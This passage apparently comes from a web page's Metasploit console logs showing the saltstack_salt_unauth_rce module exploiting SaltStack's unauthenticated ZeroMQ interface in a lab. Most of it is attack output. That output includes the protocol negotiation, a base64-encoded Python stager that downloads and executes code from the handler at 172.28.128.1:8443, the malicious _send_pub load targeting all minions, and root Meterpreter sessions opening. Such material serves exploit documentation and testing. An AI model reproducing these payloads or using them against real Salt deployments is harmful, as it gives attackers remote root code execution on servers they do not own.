kwpadl1s) Staging python payload (53902 bytes) ...\n[*] Meterpreter session 1 opened (172.28.128.1:8443 -&gt; 172.28.128.5:48236) at 2020-05-10 05:21:15 -0500\n[*] 172.28.128.5:4506 - Disconnecting from 172.28.128.5:4506\n\nmeterpreter &gt; getuid\nServer username: root\nmeterpreter &gt; sysinfo\nComputer        : ubuntu-bionic\nOS              : Linux 4.15.0-91-generic #92-Ubuntu SMP Fri Feb 28 11:09:48 UTC 2020\nArchitecture    : x64\nSystem Language : C\nMeterpreter     : python/linux\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h4 id=\"executing-python-payload-on-the-minions\" style=\"position:relative;\"><a href=\"#executing-python-payload-on-the-minions\" aria-label=\"executing python payload on the minions permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Executing Python payload on the minions</h4>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 exploit(linux/misc/saltstack_salt_unauth_rce) &gt; set target Minions\\ (Python\\ payload)\ntarget =&gt; Minions (Python payload)\nmsf5 exploit(linux/misc/saltstack_salt_unauth_rce) &gt; run\n\n[*] Started HTTPS reverse handler on https://172.28.128.1:8443\n[*] 172.28.128.5:4506 - Connecting to ZeroMQ service at 172.28.128.5:4506\n[*] 172.28.128.5:4506 - Negotiating signature\n[+] 172.28.128.5:4506 - Received valid signature: &quot;\\xFF\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x7F&quot;\n[*] 172.28.128.5:4506 - Sending identical signature\n[*] 172.28.128.5:4506 - Negotiating version\n[+] 172.28.128.5:4506 - Received compatible version: &quot;\\x03&quot;\n[*] 172.28.128.5:4506 - Sending identical version\n[*] 172.28.128.5:4506 - Negotiating NULL security mechanism\n[+] 172.28.128.5:4506 - Received NULL security mechanism\n[*] 172.28.128.5:4506 - Sending NULL security mechanism\n[*] 172.28.128.5:4506 - Sending READY command of type REQ\n[+] 172.28.128.5:4506 - Received READY reply of type ROUTER\n[*] 172.28.128.5:4506 - Executing Python payload on the minions: python/meterpreter/reverse_https\n[*] 172.28.128.5:4506 - Yeeting _send_pub() at 172.28.128.5:4506\n[*] 172.28.128.5:4506 - Executing Python code: exec(__import__(&#39;base64&#39;).b64decode(__import__(&#39;codecs&#39;).getencoder(&#39;utf-8&#39;)(&#39;aW1wb3J0IHN5cwp2aT1zeXMudmVyc2lvbl9pbmZvCnVsPV9faW1wb3J0X18oezI6J3VybGxpYjInLDM6J3VybGxpYi5yZXF1ZXN0J31bdmlbMF1dLGZyb21saXN0PVsnYnVpbGRfb3BlbmVyJywnSFRUUFNIYW5kbGVyJ10pCmhzPVtdCmlmICh2aVswXT09MiBhbmQgdmk+PSgyLDcsOSkpIG9yIHZpPj0oMyw0LDMpOgoJaW1wb3J0IHNzbAoJc2M9c3NsLlNTTENvbnRleHQoc3NsLlBST1RPQ09MX1NTTHYyMykKCXNjLmNoZWNrX2hvc3RuYW1lPUZhbHNlCglzYy52ZXJpZnlfbW9kZT1zc2wuQ0VSVF9OT05FCglocy5hcHBlbmQodWwuSFRUUFNIYW5kbGVyKDAsc2MpKQpvPXVsLmJ1aWxkX29wZW5lcigqaHMpCm8uYWRkaGVhZGVycz1bKCdVc2VyLUFnZW50JywnTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgNi4xOyBUcmlkZW50LzcuMDsgcnY6MTEuMCkgbGlrZSBHZWNrbycpXQpleGVjKG8ub3BlbignaHR0cHM6Ly8xNzIuMjguMTI4LjE6ODQ0My9hZEY5X2gxZFJrZ3BSRHhRZF9QOC1nc1V6a1hmcycpLnJlYWQoKSkK&#39;)[0]))\n[*] 172.28.128.5:4506 - Unserialized clear load: {&quot;cmd&quot;=&gt;&quot;_send_pub&quot;, &quot;kwargs&quot;=&gt;{&quot;bg&quot;=&gt;true, &quot;hide_output&quot;=&gt;true, &quot;ignore_retcode&quot;=&gt;true, &quot;output_loglevel&quot;=&gt;&quot;quiet&quot;, &quot;show_jid&quot;=&gt;false, &quot;show_timeout&quot;=&gt;false}, &quot;user&quot;=&gt;&quot;root&quot;, &quot;tgt&quot;=&gt;&quot;.*&quot;, &quot;tgt_type&quot;=&gt;&quot;pcre&quot;, &quot;jid&quot;=&gt;&quot;20200510102150723893&quot;, &quot;fun&quot;=&gt;&quot;cmd.exec_code&quot;, &quot;arg&quot;=&gt;[&quot;python&quot;, &quot;exec(__import__(&#39;base64&#39;).b64decode(__import__(&#39;codecs&#39;).getencoder(&#39;utf-8&#39;)(&#39;aW1wb3J0IHN5cwp2aT1zeXMudmVyc2lvbl9pbmZvCnVsPV9faW1wb3J0X18oezI6J3VybGxpYjInLDM6J3VybGxpYi5yZXF1ZXN0J31bdmlbMF1dLGZyb21saXN0PVsnYnVpbGRfb3BlbmVyJywnSFRUUFNIYW5kbGVyJ10pCmhzPVtdCmlmICh2aVswXT09MiBhbmQgdmk+PSgyLDcsOSkpIG9yIHZpPj0oMyw0LDMpOgoJaW1wb3J0IHNzbAoJc2M9c3NsLlNTTENvbnRleHQoc3NsLlBST1RPQ09MX1NTTHYyMykKCXNjLmNoZWNrX2hvc3RuYW1lPUZhbHNlCglzYy52ZXJpZnlfbW9kZT1zc2wuQ0VSVF9OT05FCglocy5hcHBlbmQodWwuSFRUUFNIYW5kbGVyKDAsc2MpKQpvPXVsLmJ1aWxkX29wZW5lcigqaHMpCm8uYWRkaGVhZGVycz1bKCdVc2VyLUFnZW50JywnTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgNi4xOyBUcmlkZW50LzcuMDsgcnY6MTEuMCkgbGlrZSBHZWNrbycpXQpleGVjKG8ub3BlbignaHR0cHM6Ly8xNzIuMjguMTI4LjE6ODQ0My9hZEY5X2gxZFJrZ3BSRHhRZF9QOC1nc1V6a1hmcycpLnJlYWQoKSkK&#39;)[0]))&quot;]}\n[+] 172.28.128.5:4506 - Received _send_pub() response: &quot;\\x01\\x00\\x00\\x01\\xC0&quot;\n[*] https://172.28.128.1:8443 handling request from 172.28.128.5; (UUID: foe5rluh) Staging python payload (53883 bytes) ...\n[*] Meterpreter session 2 opened (172.28.128.1:8443 -&gt; 172.28.128.5:48388) at 2020-05-10 05:21:51 -0500\n[+] 172.28.128.5:4506 - Deleted /var/cache/salt/minion/proc/20200510102150723893\n[*] 172.28.128.5:4506 - Disconnecting from 172.28.128.5:4506\n\nmeterpreter &gt; getuid\nServer username: root\nmeterpreter &gt; sysinfo\nComputer        : ubuntu-bionic\nOS              : Linux 4.15.0-91-generic #92-Ubuntu SMP Fri Feb 28 11:09:48 UTC 2020\nArchitecture    : x64\nSystem Language : C\nMeterpreter     : python/linux\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"d3e7bdd1-1365-55cb-908a-abe18f87d97d"}}}